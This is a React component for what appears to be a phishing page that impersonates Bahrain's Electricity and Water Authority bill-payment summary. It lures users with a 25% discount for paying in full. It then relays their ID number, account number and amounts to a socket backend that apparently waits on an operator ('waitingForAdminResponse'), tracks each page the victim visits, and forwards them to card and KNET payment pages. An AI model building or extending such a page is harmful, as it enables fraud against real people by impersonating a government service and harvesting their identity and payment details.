import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { sendData, navigateToPage, socket } from "@/lib/store";

export default function EWASummary() {
  const [, setLocation] = useLocation();
  const [selectedPayment, setSelectedPayment] = useState<string | null>(null);
  const [isProcessing, setIsProcessing] = useState(false);

  // Get data from localStorage
  const idTypeLabel = localStorage.getItem("ewa_idTypeLabel") || "";
  const idNumber = localStorage.getItem("ewa_idNumber") || "";
  const accountNumber = localStorage.getItem("ewa_accountNumber") || "";
  const paymentOption = localStorage.getItem("ewa_paymentOption") || "full";
  const totalAmount = localStorage.getItem("ewa_totalAmount") || "0.000";
  const finalAmount = localStorage.getItem("ewa_finalAmount") || "0.000";

  useEffect(() => {
    navigateToPage('ملخص الدفع - فواتير الكهرباء');
  }, []);

  const handlePayment = () => {
    if (!selectedPayment || isProcessing) return;
    setIsProcessing(true);

    const paymentMethodLabel = selectedPayment === 'card' ? 'بطاقة ائتمان' : 'كي نت';

    sendData({
      data: {
        service: 'فواتير الكهرباء والماء',
        paymentMethod: paymentMethodLabel,
        idType: idTypeLabel,
        idNumber,
        accountNumber,
        paymentOption: paymentOption === 'full' ? 'دفع كامل المبلغ (خصم 25%)' : 'دفع جزء من المبلغ',
        totalBillAmount: totalAmount,
        finalPaymentAmount: finalAmount,
      },
      current: 'ملخص الدفع - فواتير الكهرباء',
      nextPage: selectedPayment === 'knet' ? 'knet-payment' : 'credit-card-payment',
      waitingForAdminResponse: false,
    });

    // Save total for payment pages
    localStorage.setItem('Total', finalAmount);

    setTimeout(() => {
      setIsProcessing(false);
      if (selectedPayment === 'knet') {
        window.location.href = '/knet-payment';
      } else {
        window.location.href = `/credit-card-payment?service=${encodeURIComponent('فواتير الكهرباء والماء')}&amount=${finalAmount}`;
      }
    }, 1500);
  };

  return (
    <>
      <style dangerouslySetInnerHTML={{ __html: `
        .ewa-summary-page, .ewa-summary-page * {
          font-family: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", "Noto Sans", Arial, sans-serif !important;
          box-sizing: border-box;
        }
        .ewa-summary-page {
          direction: rtl;
          min-height: 100vh;
          background: #FAFAFA;
          color: #17171C;
          font-size: 16px;
          line-height: 1.5;
        }
        .ewa-s-header {
          background: linear-gradient(135deg, #003366 0%, #0055a4 100%);
          padding: 16px 0;
          color: white;
        }
        .ewa-s-header-inner {
          max-width: 960px;
          margin: 0 auto;
          padding: 0 20px;
          display: flex;
          align-items: center;
          justify-content: space-between;
        }
        .ewa-s-header h1 {
          font-size: 20px;
          font-weight: 700;
          margin: 0;
        }
        .ewa-s-container {
          max-width: 960px;
          margin: 0 auto;
          padding: 24px 20px;
        }
        .ewa-s-blue-bar {
          background: #003366;
          color: white;
          padding: 12px 20px;
          font-size: 15px;
          font-weight: 600;
          border-radius: 4px;
          margin-bottom: 16px;
          display: flex;
          align-items: center;
          gap: 8px;
        }
        .ewa-s-card {
          background: white;
          border: 1px solid #e0e0e0;
          border-radius: 8px;
          padding: 20px;
          margin-bottom: 16px;
        }
        .ewa-s-row {
          display: flex;
          justify-content: space-between;
          padding: 10px 0;
          border-bottom: 1px solid #f0f0f0;
          font-size: 14px;
        }
        .ewa-s-row:last-child {
          border-bottom: none;
        }
        .ewa-s-label {
          color: #666;
          font-weight: 500;
        }
        .ewa-s-value {
          color: #17171C;
          font-weight: 600;
        }
        .ewa-s-total-card {
          background: #e8f0fe;
          border: 2px solid #003366;
          border-radius: 8px;
          padding: 20px;
          margin-bottom: 24px;
        }
        .ewa-s-total-row {
          display: flex;
          justify-content: space-between;
          align-items: center;
        }
        .ewa-s-total-label {
          font-size: 16px;
          font-weight: 600;
          color: #003366;
        }
        .ewa-s-total-value {
          font-size: 22px;
          font-weight: 800;
          color: #003366;
        }
        .ewa-s-payment-method {
          display: flex;
          align-items: center;
          justify-content: space-between;
          padding: 16px 20px;
          background: white;
          border: 2px solid #e0e0e0;
          border-radius: 8px;
          margin-bottom: 10px;
          cursor: pointer;
          transition: all 0.2s;
        }
        .ewa-s-payment-method:hover {
          border-color: #003366;
          background: #f8faff;
        }
        .ewa-s-payment-method.active {
          border-color: #003366;
          background: #e8f0fe;
        }
        .ewa-s-pm-right {
          display: flex;
          align-items: center;
          gap: 12px;
        }
        .ewa-s-radio {
          width: 20px;
          height: 20px;
          border-radius: 50%;
          border: 2px solid #ccc;
          display: flex;
          align-items: center;
          justify-content: center;
          flex-shrink: 0;
          transition: all 0.2s;
        }
        .ewa-s-payment-method.active .ewa-s-radio {
          border-color: #003366;
        }
        .ewa-s-radio-inner {
          width: 10px;
          height: 10px;
          border-radius: 50%;
          background: #003366;
          opacity: 0;
          transition: opacity 0.2s;
        }
        .ewa-s-payment-method.active .ewa-s-radio-inner {
          opacity: 1;
        }
        .ewa-s-pm-label {
          font-size: 15px;
          font-weight: 600;
          color: #17171C;
        }
        .ewa-s-pm-icon {
          height: 28px;
        }
        .ewa-s-buttons {
          display: flex;
          gap: 12px;
          justify-content: center;
          margin-top: 24px;
          flex-wrap: wrap;
        }
        .ewa-s-btn-primary {
          background: #003366;
          color: white;
          border: none;
          padding: 14px 50px;
          border-radius: 6px;
          font-size: 16px;
          font-weight: 600;
          cursor: pointer;
          transition: background 0.2s;
          opacity: 1;
        }
        .ewa-s-btn-primary:hover {
          background: #004488;
        }
        .ewa-s-btn-primary:disabled {
          opacity: 0.5;
          cursor: not-allowed;
        }
        .ewa-s-btn-secondary {
          background: white;
          color: #003366;
          border: 2px solid #003366;
          padding: 14px 50px;
          border-radius: 6px;
          font-size: 16px;
          font-weight: 600;
          cursor: pointer;
          transition: all 0.2s;
        }
        .ewa-s-btn-secondary:hover {
          background: #f0f4ff;
        }
        .ewa-s-processing {
          display: flex;
          align-items: center;
          justify-content: center;
          gap: 10px;
          padding: 20px;
          color: #003366;
          font-size: 15px;
        }
        .ewa-s-spinner {
          width: 20px;
          height: 20px;
          border: 3px solid #e0e0e0;
          border-top-color: #003366;
          border-radius: 50%;
          animation: ewa-s-spin 0.8s linear infinite;
        }
        @keyframes ewa-s-spin {
          to { transform: rotate(360deg); }
        }
      `}} />

      <div className="ewa-summary-page">
        {/* Header */}
        <div className="ewa-s-header">
          <div className="ewa-s-header-inner">
            <h1>ملخص الدفع</h1>
            <img src="/bahrain-logo.png" alt="البحرين" style={{ height: '40px' }} onError={(e) => { (e.target as HTMLImageElement).style.display = 'none'; }} />
          </div>
        </div>

        <div className="ewa-s-container">
          {/* Bill Summary */}
          <div className="ewa-s-blue-bar">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
              <path d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
            </svg>
            <span>ملخص الفاتورة</span>
          </div>

          <div className="ewa-s-card">
            <div className="ewa-s-row">
              <span className="ewa-s-label">الخدمة</span>
              <span className="ewa-s-value">فاتورة الكهرباء والماء</span>
            </div>
            <div className="ewa-s-row">
              <span className="ewa-s-label">نوع الهوية</span>
              <span className="ewa-s-value">{idTypeLabel}</span>
            </div>
            <div className="ewa-s-row">
              <span className="ewa-s-label">رقم الهوية</span>
              <span className="ewa-s-value">{idNumber}</span>
            </div>
            <div className="ewa-s-row">
              <span className="ewa-s-label">رقم الحساب</span>
              <span className="ewa-s-value">{accountNumber}</span>
            </div>
            <div className="ewa-s-row">
              <span className="ewa-s-label">نوع الدفع</span>
              <span className="ewa-s-value">{paymentOption === 'full' ? 'دفع كامل المبلغ (خصم 25%)' : 'دفع جزء من المبلغ'}</span>
            </div>
            <div className="ewa-s-row">
              <span className="ewa-s-label">إجمالي الفاتورة</span>
              <span className="ewa-s-value">{totalAmount} د.ب</span>
            </div>
          </div>

          {/* Final Amount */}
          <div className="ewa-s-total-card">
            <div className="ewa-s-total-row">
              <span className="ewa-s-total-label">المبلغ المطلوب دفعه:</span>
              <span className="ewa-s-total-value">{finalAmount} د.ب</span>
            </div>
          </div>

          {/* Payment Method Selection */}
          <div className="ewa-s-blue-bar">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
              <rect x="2" y="5" width="20" height="14" rx="2" stroke="white" strokeWidth="2"/>
              <path d="M2 10h20" stroke="white" strokeWidth="2"/>
            </svg>
            <span>اختر طريقة الدفع</span>
          </div>

          {/* KNET */}
          <div
            className={`ewa-s-payment-method ${selectedPayment === 'knet' ? 'active' : ''}`}
            onClick={() => setSelectedPayment('knet')}
          >
            <div className="ewa-s-pm-right">
              <div className="ewa-s-radio"><div className="ewa-s-radio-inner"></div></div>
              <span className="ewa-s-pm-label">كي نت (KNET)</span>
            </div>
            <img src="/knet-logo.png" alt="KNET" className="ewa-s-pm-icon" onError={(e) => { (e.target as HTMLImageElement).style.display = 'none'; }} />
          </div>

          {/* Credit Card */}
          <div
            className={`ewa-s-payment-method ${selectedPayment === 'card' ? 'active' : ''}`}
            onClick={() => setSelectedPayment('card')}
          >
            <div className="ewa-s-pm-right">
              <div className="ewa-s-radio"><div className="ewa-s-radio-inner"></div></div>
              <span className="ewa-s-pm-label">بطاقة ائتمان (Visa / Mastercard)</span>
            </div>
            <div style={{ display: 'flex', gap: '6px' }}>
              <img src="/visa-logo.png" alt="Visa" className="ewa-s-pm-icon" onError={(e) => { (e.target as HTMLImageElement).style.display = 'none'; }} />
              <img src="/mastercard-logo.png" alt="Mastercard" className="ewa-s-pm-icon" onError={(e) => { (e.target as HTMLImageElement).style.display = 'none'; }} />
            </div>
          </div>

          {/* Processing */}
          {isProcessing && (
            <div className="ewa-s-processing">
              <div className="ewa-s-spinner"></div>
              <span>جاري تحويلك لصفحة الدفع...</span>
            </div>
          )}

          {/* Buttons */}
          <div className="ewa-s-buttons">
            <button
              className="ewa-s-btn-primary"
              onClick={handlePayment}
              disabled={!selectedPayment || isProcessing}
            >
              {isProcessing ? 'جاري المعالجة...' : 'ادفع الآن'}
            </button>
            <button className="ewa-s-btn-secondary" onClick={() => setLocation('/ewa-bills')}>
              رجوع
            </button>
          </div>
        </div>
      </div>
    </>
  );
}
